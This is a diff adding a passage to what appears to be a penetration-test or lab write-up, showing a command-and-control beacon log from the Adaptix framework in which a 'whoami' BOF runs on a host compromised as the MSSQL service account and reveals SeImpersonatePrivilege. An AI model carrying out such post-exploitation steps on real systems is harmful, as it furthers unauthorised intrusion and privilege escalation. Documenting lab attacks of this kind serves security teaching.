@@ -1213,6 +1213,47 @@ This shows the flow of the attack
 I now have a beacon
 
 ```python
++-------------------------------------------------------------------------------------+
 
+[29/08 18:12:58] ethan [25877138] beacon > whoami
+[29/08 18:12:58] [*] BOF implementation: whoami /all
+[29/08 18:13:00] [*] Agent called server, sent [6.56 Kb]
+[29/08 18:13:01] [+] BOF output
+
+UserName		SID
+====================== ====================================
+NT Service\MSSQLSERVER	S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\SERVICE                              Well-known group         S-1-5-6                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+NT SERVICE\ALL SERVICES                           Well-known group         S-1-5-80-0                                    Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      
+SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
+SeCreateGlobalPrivilege       Create global objects                             Enabled                       
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
+[29/08 18:13:01] [+] BOF finished
+
++--- Task [25877138] closed ----------------------------------------------------------+
 ```
+
+Ill run the `whoami` BOF in adaptix and i see i have SeImpersonate
+
+
 
